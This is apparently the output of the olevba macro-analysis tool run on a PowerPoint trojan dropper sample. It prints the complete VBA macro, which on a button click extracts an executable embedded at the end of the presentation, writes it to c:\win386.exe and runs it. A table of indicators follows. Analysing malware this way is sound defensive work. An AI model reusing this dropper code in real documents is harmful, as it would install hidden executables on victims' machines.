olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Trojan-Dropper.MSWord.Slide
Type: PPT
-------------------------------------------------------------------------------
VBA MACRO Slide3.cls 
in file: None - OLE stream: 'VBA/Slide3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Slide4.cls 
in file: None - OLE stream: 'VBA/Slide4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub CommandButton1_Click()
On Error Resume Next
   Dim buffer(65536) As Byte
   Dim h, h2, j, i, k As Long
   
   h = CreateFile(ActivePresentation.FullName, &H80000000, 1 + 2, 0, 3, 0, 0)
   h2 = CreateFile("c:\win386.exe", &H40000000, 0, 0, 2, 0, 0)
   If h = -1 Then
      Exit Sub
   End If
   k = SetFilePointer(h, -42496, nil, 2)
   Do
      i = ReadFile(h, buffer(0), 65536, j, 0)
      i = WriteFile(h2, buffer(0), j, j, 0)
   Loop Until j < 65536
   
   CloseHandle (h)
   CloseHandle (h2)
Shell ("c:\win386.exe")
End Sub
-------------------------------------------------------------------------------
VBA MACRO 模块1.bas 
in file: None - OLE stream: 'VBA/模块1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Declare Function CreateFile Lib "kernel32" Alias "CreateFileA" (ByVal lpFileName As String, ByVal dwDesiredAccess As Long, ByVal dwShareMode As Long, ByVal lpSecurityAttributes As Long, ByVal dwCreationDistribution As Long, ByVal dwFlagsAndAttributes As Long, ByVal hTemplate As Long) As Long
Public Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Public Declare Function ReadFile Lib "kernel32" (ByVal hFile As Long, lpBuffer As Byte, ByVal dwNumberOfBytesToRead As Long, lpNumberOfBytesRead As Long, ByVal lpOverlapped As Long) As Long
Public Declare Function WriteFile Lib "kernel32" (ByVal hFile As Long, lpBuffer As Byte, ByVal dwNumberOfBytesToWrite As Long, lpNumberOfBytesWritten As Long, ByVal lpOverlapped As Long) As Long
Public Declare Function SetFilePointer Lib "kernel32" (ByVal hFile As Long, ByVal lDistanceToMove As Long, ByVal lpDistanceToMoveHigh As Long, ByVal dwMoveMethod As Long) As Long

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |win386.exe          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

